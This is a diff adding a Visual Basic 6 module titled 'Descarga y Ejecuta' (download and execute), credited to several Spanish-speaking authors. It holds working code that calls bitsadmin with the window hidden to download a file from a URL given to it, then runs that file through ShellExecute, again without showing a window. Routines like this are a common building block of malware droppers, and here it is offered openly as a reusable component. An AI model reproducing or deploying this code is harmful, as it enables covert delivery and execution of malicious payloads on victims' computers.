@@ -1,0 +1,78 @@
+'---------------------------------------------
+' Descarga y Ejecuta
+' Autor Autoit: M3
+' Version Delphi: Metal_Kingdom
+' Version VB6: Pink
+' Fecha: 14-02-2013
+' Propósito: Descarga Y Ejecuta
+' Uso : Down_E(Link descarga,Ruta A guardar)
+'---------------------------------------------
+ 
+ 
+Option Explicit
+ 
+Private Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
+End Type
+ 
+Private Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessID As Long
+dwThreadID As Long
+End Type
+ 
+Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
+Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
+ 
+Private Const NORMAL_PRIORITY_CLASS = &H20&
+Private Const INFINITE = -1&
+ 
+Public Sub Shellwait(ByVal cmd As String)
+     
+    Dim ret As Long
+    Dim proc As PROCESS_INFORMATION
+    Dim start As STARTUPINFO
+     
+     
+    start.cb = Len(start)
+    start.wShowWindow = vbHide
+    start.dwFlags = vbNormalFocus
+     
+    ret = CreateProcessA(0&, cmd, 0&, 0&, False, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
+    If ret Then
+         
+        ret = WaitForSingleObject(proc.hProcess, INFINITE)
+        ret = CloseHandle(proc.hProcess)
+        ret = CloseHandle(proc.hThread)
+    End If
+     
+End Sub
+ 
+ 
+ 
+Private Function Down_E(sUrl As String, sPath As String)
+    Dim Sparameter As String
+    Sparameter = "bitsadmin /transfer myjob /download /priority High " & sUrl & " " & sPath
+    Shellwait (Sparameter)
+    ShellExecute vbNull, "OPEN", sPath, vbNullString, vbNullString, 0
+End Function
